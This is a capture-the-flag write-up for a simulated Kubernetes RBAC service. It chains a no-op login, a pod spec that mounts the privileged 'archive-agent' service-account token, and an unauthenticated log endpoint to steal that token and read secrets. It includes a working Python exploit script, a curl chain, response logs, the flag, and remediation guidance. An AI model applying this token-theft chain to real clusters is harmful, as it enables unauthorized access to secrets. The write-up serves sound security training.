# Greenroom Atlas — Safcom CTF (Cloud, 550 pts)

**Target:** `http://54.72.82.22:8410`
**Category:** Cloud
**Flag:** `safctf{6035ffad158ce604cb84927b77926d47}`

> *"Every shelf has room for another leaf."*
> Hint: *"A cached access list names a former role; it may not reflect the current service."*

---

## 1. TL;DR

The service is a miniature **Kubernetes RBAC** implementation in the `backstage`
namespace. One public download, `/downloads/cluster.json`, ships a **cached access
list** describing bindings, roles and service accounts.

Three flaws chain together:

1. **No authentication.** `POST /api/login` ignores its body and returns
   `{"token": "tour-bot"}` to anyone. The bearer "token" is simply the binding name —
   no credential, no signature, no expiry.
2. **An unauthenticated log endpoint (the core bug).** `GET /api/workloads/NAME/logs`
   performs **no authorization check at all** — no header, an empty bearer, a bogus
   bearer, a `Basic` header and a raw token all return `200`.
3. **Attacker-controlled service-account token automount.** `POST /api/workloads`
   accepts a spec containing `serviceAccountName` **and**
   `automountServiceAccountToken`. Requesting the privileged `archive-agent` account
   with automount enabled projects its token into the pod, where it is echoed into the
   (unauthenticated) logs.

Final requests:

```
POST /api/workloads   {spec:{serviceAccountName:"archive-agent", automountServiceAccountToken:true}}
GET  /api/workloads/<name>/logs          # no Authorization header
GET  /api/secrets     Authorization: Bearer archive-agent
```

```json
{"message":"safctf{6035ffad158ce604cb84927b77926d47}","ok":true}
```

---

## 2. Reconnaissance

### 2.1 Fingerprint

```
$ curl -i http://54.72.82.22:8410/
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.11.16
Content-Type: text/html; charset=utf-8
Content-Length: 4128
```

Flask/Werkzeug on Python 3.11, served directly — all logic is app-level, no reverse
proxy, no real cluster anywhere.

### 2.2 The landing page

Same "collection desk" template family as the sibling challenges, titled *Greenroom
Atlas* / *Botanical Studio*. The documented API surface:

```
POST  /api/login                              -> {token}
PATCH /api/bindings      {roleRef}            -> repoint a binding's role
POST  /api/workloads     {spec}               -> create a workload
GET   /api/workloads/NAME/logs                -> read a workload's logs
GET   /api/secrets                            -> read the protected secret
Authorization: Bearer TOKEN
```

The "desk console" is again a **client-side `fetch()` REPL** guarded by
`if(!path.startsWith('/')||path.startsWith('//'))` — a convenience tool, not a
server-side proxy and not an SSRF primitive.

### 2.3 The public download — the cached access list

`/downloads/cluster.json`:

```json
{
  "namespace": "backstage",
  "bindings": {
    "tour-bot": [
      "get:workloads",
      "patch:rolebindings"
    ]
  },
  "roles": {
    "editor": [
      "create:workloads",
      "get:workloads/logs"
    ]
  },
  "serviceAccounts": {
    "default": [
      "read:public"
    ],
    "archive-agent": [
      "get:secrets"
    ]
  }
}
```

Read literally, this says: `tour-bot` may list workloads and patch role bindings;
`create:workloads` and `get:workloads/logs` belong to a role named **`editor`**; and the
service account that holds `get:secrets` is **`archive-agent`**.

That is the whole map. The hint is now legible — the cached list *names a former role*
(`editor`) and *may not reflect the current service*.

### 2.4 Baseline behaviour

| Request | Result |
|---|---|
| `GET /health` | `200 {"status":"ok"}` |
| `POST /api/login {}` | `200 {"namespace":"backstage","token":"tour-bot"}` |
| `GET /api/secrets` (no auth) | `403 {"message":"The request could not be completed.","ok":false}` |
| `GET /api/bindings` | `404` — PATCH-only |
| `GET /api/workloads` | `404` — POST-only |
| `/api/identity`, `/api/roles`, `/api/serviceaccounts`, `/api/me`, `/api/cluster`, `/api/config` | `404` |

Unknown `/api/*` paths return the JSON catch-all `{"message":"Not found"}`. Only
`cluster.json` exists under `/downloads/`.

---

## 3. Exploitation

### 3.1 Login is a formality

```
POST /api/login
{}

HTTP/1.1 200
{"namespace":"backstage","token":"tour-bot"}
```

The body is ignored entirely — `{}`, `{"username":"alice"}`, `{"binding":"x"}` and
`{"name":"x"}` all return the same token. The "token" is the string `tour-bot`, i.e.
the **name of the binding**, and it is used verbatim as
`Authorization: Bearer tour-bot`. There is no credential to guess because there is no
credential check.

### 3.2 The cached list understates `tour-bot` — the PATCH is a decoy

The cached list says `tour-bot` holds only `get:workloads` and `patch:rolebindings` —
notably **not** `create:workloads`. The obvious move the cache suggests is the classic
Kubernetes RBAC escalation: use `patch:rolebindings` to repoint your own binding at the
more privileged `editor` role.

```
PATCH /api/bindings
Authorization: Bearer tour-bot
{"name":"tour-bot","roleRef":"editor"}

HTTP/1.1 200
{"updated":true}
```

It works — and `editor` is the **only** accepted value:

| `roleRef` | Result |
|---|---|
| `editor` | **200 `{"updated":true}`** |
| `admin`, `viewer`, `tour-bot`, `archive-agent`, `default`, `none`, `""` | `403` |
| `{"kind":"Role","name":"editor"}` (full K8s shape) | `403` — a bare string is required |

So the "former role" in the hint is `editor`, and the cache's job was to lead us to the
PATCH. **But the PATCH is not load-bearing.** In my very first probe, `POST
/api/workloads` already returned `200` with the plain `tour-bot` token *before any
PATCH had been issued*. The live binding for `tour-bot` already carries the permissions
the cached list attributes to `editor` — which is exactly what the hint warns about.
The cached entry is stale; the current service disagrees with it.

### 3.3 Creating a workload that mounts the privileged service account

The documented spec fields are `serviceAccountName` and
`automountServiceAccountToken`. Supplying both, pointing at the account the cached list
says holds `get:secrets`:

```
POST /api/workloads
Authorization: Bearer tour-bot
{"name":"atlas-pod",
 "spec":{"serviceAccountName":"archive-agent","automountServiceAccountToken":true}}

HTTP/1.1 200
{"name":"b2c921f78094040f"}
```

The app returns a generated workload name. Both fields matter, and the exact
combination is required — see §4.2.

### 3.4 Reading the logs with no credentials at all

```
GET /api/workloads/b2c921f78094040f/logs

HTTP/1.1 200
{"token":"archive-agent"}
```

No `Authorization` header. No session. Nothing. The endpoint returns the projected
service-account token of the pod — and the pod was created mounting `archive-agent`,
so the token is the name of the account that holds `get:secrets`.

### 3.5 Spending the stolen token

```
GET /api/secrets
Authorization: Bearer archive-agent

HTTP/1.1 200
{"message":"safctf{6035ffad158ce604cb84927b77926d47}","ok":true}
```

**Flag captured.**

---

## 4. Semantics, mapped empirically

I characterised each control rather than trusting the first hit.

### 4.1 Who may do what

| Token | `POST /api/workloads` | `GET …/logs` | `GET /api/secrets` |
|---|---|---|---|
| `tour-bot` | **200** | **200** | `403` |
| `editor` | `403` | **200** | `403` |
| `archive-agent` | `403` | **200** | **200** |
| `default` | `403` | **200** | `403` |
| `admin`, `anonymous`, `nonexistent`, `""` | `403` | **200** | `403` |

Two things stand out. **Workload creation is bound to the `tour-bot` identity alone** —
no other name can create, including `editor` and `admin`. And **the log endpoint answers
to everyone**: every token in the table read the logs, and so did requests with *no*
credential at all (§4.3).

### 4.2 The token automount requires both fields, truthy

| `spec` sent to `POST /api/workloads` | Logs |
|---|---|
| `{"serviceAccountName":"archive-agent"}` | `{"lines":["Ready."]}` |
| `{"automountServiceAccountToken":true}` | `{"lines":["Ready."]}` |
| `{"serviceAccountName":"archive-agent","automountServiceAccountToken":true}` | **`{"token":"archive-agent"}`** |
| `{"serviceAccountName":"archive-agent","automountServiceAccountToken":"true"}` | **`{"token":"archive-agent"}`** (truthy string works) |
| `{"serviceAccountName":"archive-agent","automountServiceAccountToken":false}` | `{"lines":["Ready."]}` |
| `{"serviceAccountName":"default","automountServiceAccountToken":true}` | `{"lines":["Ready."]}` |

The token is only projected when **both** a non-default `serviceAccountName` **and** a
truthy `automountServiceAccountToken` are present. Requesting the automount is the
attacker's lever: in real Kubernetes this flag is set by whoever writes the pod spec,
and a tenant who can create pods can therefore mint credentials for any service account
they can name. That is the vulnerability the challenge models.

### 4.3 The log endpoint has no authorization whatsoever

| Request to `GET /api/workloads/<name>/logs` | Result |
|---|---|
| *(no header)* | **200 `{"token":"archive-agent"}`** |
| `Authorization: Bearer ` (empty) | **200** |
| `Authorization: Bearer zzz` (bogus) | **200** |
| `Authorization: tour-bot` (no scheme) | **200** |
| `Authorization: Basic dG91ci1ib3Q=` | **200** |
| `Authorization: Bearer tour-bot` | **200** |

The header is not merely under-checked; it is **not consulted at all**. This is the
core defect: the logs — which contain the projected service-account token — are world
readable.

### 4.4 Misc

* **Workload names are server-generated.** The `name` supplied in the spec is ignored;
  each create returns a fresh 16-hex-char name.
* **Unknown workload names** → `400 {"message":"Request unavailable."}`. Names are
  opaque per-created-pod identifiers, not paths — traversal strings
  (`../../etc/passwd`, `../secrets`) return the same `400`, so there is no path surface
  here.
* **`/api/bindings` is PATCH-only** and only accepts the bare string `editor` for
  `roleRef`; the structured `{"kind":"Role","name":"editor"}` shape is rejected.
* **Extra keys are ignored** everywhere (login body, PATCH body, workload spec).
* **No SSRF.** The "desk console" is browser-side `fetch()` against the same origin; no
  server-side URL fetch and no IMDS (`169.254.169.254`) reachable.
* **No real Kubernetes involved** — a Flask simulation, but one that models
  `RoleBinding`/`roleRef`, `serviceAccountName` and token automount faithfully enough
  that the lesson transfers directly to a real cluster.

---

## 5. Proof-of-concept

`solve.py` automates the whole chain from scratch. Stdlib only.

```python
#!/usr/bin/env python3
import json
import re
import sys
import urllib.error
import urllib.request

BASE = "http://54.72.82.22:8410"
FLAG_RE = re.compile(r"safctf\{[^}]+\}")


def http(path, method="GET", data=None, hdrs=None):
    headers = {"Content-Type": "application/json"}
    headers.update(hdrs or {})
    req = urllib.request.Request(BASE + path, method=method, data=data, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def bearer(token):
    return {"Authorization": "Bearer " + token}


def main() -> int:
    # 0. the cached access list (the hint)
    _, body = http("/downloads/cluster.json")
    cluster = json.loads(body)
    print(f"[*] cached access list  namespace={cluster['namespace']!r}")
    for name, perms in cluster["bindings"].items():
        print(f"      binding        {name:<14} -> {perms}")
    for name, perms in cluster["roles"].items():
        print(f"      role           {name:<14} -> {perms}")
    for name, perms in cluster["serviceAccounts"].items():
        print(f"      serviceAccount {name:<14} -> {perms}")

    # 1. login: no credential check, identity == binding name
    _, body = http("/api/login", "POST", b"{}")
    token = json.loads(body)["token"]
    print(f"\n[*] POST /api/login (empty body) -> token={token!r}")

    # 2. the cached list understates tour-bot; the PATCH is a decoy
    status, body = http("/api/bindings", "PATCH",
                        json.dumps({"name": token, "roleRef": "editor"}).encode(),
                        bearer(token))
    print(f"[*] PATCH /api/bindings roleRef=editor -> HTTP {status} (accepted, but not required)")

    # 3. create a workload that mounts the privileged service account
    spec = {"name": "atlas-pod",
            "spec": {"serviceAccountName": "archive-agent",
                     "automountServiceAccountToken": True}}
    _, body = http("/api/workloads", "POST", json.dumps(spec).encode(), bearer(token))
    name = json.loads(body)["name"]
    print(f"[*] POST /api/workloads {{serviceAccountName: archive-agent, automount: true}} -> name={name!r}")

    # 4. read the logs with NO Authorization header at all
    _, body = http(f"/api/workloads/{name}/logs")
    sa_token = json.loads(body)["token"]
    print(f"[*] GET /api/workloads/{name}/logs (no auth header) -> stolen token {sa_token!r}")

    # 5. spend the stolen token on /api/secrets
    _, body = http("/api/secrets", hdrs=bearer(sa_token))
    flag = FLAG_RE.search(body)
    if flag:
        print(f"\n[+] FLAG: {flag.group(0)}")
        return 0
    print(f"\n[-] no flag found: {body[:300]}")
    return 1


if __name__ == "__main__":
    sys.exit(main())
```

Run:

```
$ python3 solve.py
[*] cached access list (HTTP 200)  namespace='backstage'
      binding        tour-bot       -> ['get:workloads', 'patch:rolebindings']
      role           editor         -> ['create:workloads', 'get:workloads/logs']
      serviceAccount default        -> ['read:public']
      serviceAccount archive-agent  -> ['get:secrets']

[*] POST /api/login (empty body) -> HTTP 200 token='tour-bot'
[*] PATCH /api/bindings roleRef=editor -> HTTP 200 {"updated":true} (accepted, but not required)
[*] POST /api/workloads {serviceAccountName: archive-agent, automount: true} -> HTTP 200 name='b2c921f78094040f'
[*] GET /api/workloads/b2c921f78094040f/logs  (no auth header) -> HTTP 200
[*] stolen service-account token    : 'archive-agent'
[*] GET /api/secrets  Bearer archive-agent -> HTTP 200

[+] FLAG: safctf{6035ffad158ce604cb84927b77926d47}
```

Minimal `curl` repro:

```bash
# 1. login (no credential needed)
TOK=$(curl -s -X POST http://54.72.82.22:8410/api/login \
        -H 'Content-Type: application/json' -d '{}' \
      | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')

# 2. create a pod that mounts the privileged service account
NAME=$(curl -s -X POST http://54.72.82.22:8410/api/workloads \
        -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
        -d '{"name":"pwn","spec":{"serviceAccountName":"archive-agent","automountServiceAccountToken":true}}' \
      | python3 -c 'import sys,json;print(json.load(sys.stdin)["name"])')

# 3. read the pod logs with NO auth header -> the SA token
SATOK=$(curl -s "http://54.72.82.22:8410/api/workloads/$NAME/logs" \
      | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')

# 4. read the secret
curl -s http://54.72.82.22:8410/api/secrets -H "Authorization: Bearer $SATOK"
# {"message":"safctf{6035ffad158ce604cb84927b77926d47}","ok":true}
```

Verified twice — by the stdlib PoC above, and independently by driving the same curl
chain through HexStrike's `execute_command`, which reproduced the identical flag.

---

## 6. Attack chain

```
 http://54.72.82.22:8410/
        │
        ├─ (0) RECON       GET /downloads/cluster.json   (public, cached — the hint)
        │        bindings        tour-bot -> [get:workloads, patch:rolebindings]
        │        roles           editor   -> [create:workloads, get:workloads/logs]
        │        serviceAccounts archive-agent -> [get:secrets]        <-- the target
        │
        ├─ (1) LOGIN       POST /api/login {}          (body ignored)
        │        -> token "tour-bot"   (identity == binding name, no credential)
        │
        ├─ (2) DECOY       PATCH /api/bindings {"roleRef":"editor"}
        │        -> 200 {"updated":true}     (the only accepted value; NOT required —
        │                                     tour-bot already holds the live perms)
        │
        ├─ (3) PLANT       POST /api/workloads
        │        {"spec":{"serviceAccountName":"archive-agent",
        │                  "automountServiceAccountToken":true}}
        │        -> 200 {"name":"b2c921f78094040f"}
        │           the archive-agent token is projected into the pod
        │
        ├─ (4) STEAL       GET /api/workloads/b2c921f78094040f/logs
        │        *** NO Authorization header ***
        │        -> 200 {"token":"archive-agent"}
        │
        └─ (5) FLAG        GET /api/secrets   Authorization: Bearer archive-agent
                 safctf{6035ffad158ce604cb84927b77926d47}
```

---

## 7. Root cause & remediation

### 7.1 `GET /api/workloads/NAME/logs` has no authorization

This is the substantive vulnerability. A pod's logs routinely contain whatever the
workload printed — here, deliberately, the projected service-account token. Leaving the
read unauthenticated turns every pod's log stream into a credential oracle.

```python
# BEFORE — anything that can reach the route can read it
@app.get("/api/workloads/<name>/logs")
def logs(name):
    return jsonify({"lines": PODS[name].log})

# AFTER — authorize the caller for get:workloads/logs on THIS workload, and never
#         let a pod's logs carry a credential in the first place
@app.get("/api/workloads/<name>/logs")
def logs(name):
    caller = authenticate(request)                 # real verification
    if not authorized(caller, "get:workloads/logs", name):
        abort(403)
    return jsonify({"lines": PODS[name].log})
```

Real Kubernetes gets this right by construction: with the API server, reading pod logs
requires `pods/log` permission *and* the service-account token is a signed, expiring,
audience-bound JWT — not a bare name. Even if the token leaked, it would be useless
outside its intended audience and would expire.

### 7.2 Caller-controlled service-account token automount

The pod spec is attacker input, and it decides *whose* credentials the pod receives.
Any principal who may create workloads can therefore mint a token for any service
account it can name — a direct, if simulated, instance of the classic "create a pod,
mount the privileged SA" escalation.

```yaml
# BEFORE — the requester picks the identity and asks for its token
spec:
  serviceAccountName: archive-agent          # attacker-chosen
  automountServiceAccountToken: true         # attacker-chosen
```

Remediation, in order of preference:

* **Admission control.** Reject pod specs that set `serviceAccountName` to anything
  other than a caller-owned account, and force `automountServiceAccountToken: false`
  for workloads that do not need cluster API access. This is what
  `automountServiceAccountToken` defaults to and what Pod Security Admission /
  OPA-Gatekeeper policies enforce in a real cluster.
* **Least privilege on `create`.** `create:workloads` is effectively equivalent to
  "assume any service account's identity"; grant it only to principals trusted with
  every service account in the namespace, and keep privileged accounts like
  `archive-agent` in a separate namespace with a binding that no tenant can reference.
* **Short-lived, bound tokens.** Use projected service-account tokens with an
  explicit `audience` and short `expirationSeconds`, so the artifact in the logs is
  not a durable credential.

### 7.3 Authentication is a no-op, and the cached list is trusted

`POST /api/login` returns a token without verifying anything, and the bearer "token" is
just the binding name — anyone can claim any identity they can guess. The published
`cluster.json` compounds this: it is a **cached** snapshot of the authorization model
that no longer matches the live bindings, so it simultaneously understates `tour-bot`
(you can actually create workloads without patching) and hands the attacker a precise
inventory of what to go after (`archive-agent` → `get:secrets`).

* Issue real, signed, expiring credentials; do not equate a name with a token.
* Do not publish an authorization map to the document root — it is a roadmap.
* If such a file must exist, generate it from the live bindings on every request so
  it cannot go stale — or, better, do not expose it at all.

---

## 8. Notes / dead ends

* **The PATCH is a decoy.** The cached list (`patch:rolebindings` on `tour-bot`,
  `create:workloads` on `editor`) strongly implies the intended step is to repoint your
  binding at `editor`. It returns `{"updated":true}` and `editor` is the only accepted
  value — but in testing `POST /api/workloads` already succeeded with the plain
  `tour-bot` token *before any PATCH was issued*. The cached binding does not reflect
  the live service, exactly as the hint says. The PATCH is left in `solve.py` because it
  is part of the documented surface (and harmless), but the chain does not depend on it.
* **`create:workloads` is identity-bound, not role-bound.** Only the `tour-bot` token
  can create — `editor`, `admin`, `default`, `archive-agent` and junk all get `403`.
  So patching to `editor` would not have granted anything even if it were needed.
* **No SSRF.** The "desk console" is browser-side `fetch()` against the same origin.
* **No path traversal in the log route.** Workload names are opaque server-generated
  IDs; unknown names (including traversal strings) return a uniform `400`.
* **`/api/bindings` is PATCH-only** and rejects the structured `roleRef` object shape.
* **No real Kubernetes or cloud metadata service** is reachable — but the RBAC and
  token-projection semantics modelled here match the real primitives closely enough that
  the escalation path is the same one that matters in a live cluster.

---

## 9. Tooling

* `solve.py` — stdlib-only automated exploit (recon → login → plant → steal → read).
* `cluster.json` — the public cached access list, saved alongside this writeup.
* **HexStrike MCP** — `execute_command` ran the equivalent `curl` chain against the
  target and independently reproduced the flag; an earlier `httpx_probe` invocation
  failed with `No input provided: no files found` (its wrapper appears to want a file
  argument), so `execute_command` was used instead.
* **BlackBook MCP** — `knowledge_context` case `greenroom-atlas-ctf` (case_id 11)
  records the observations and the finding.

---

## 10. Flag

```
safctf{6035ffad158ce604cb84927b77926d47}
```
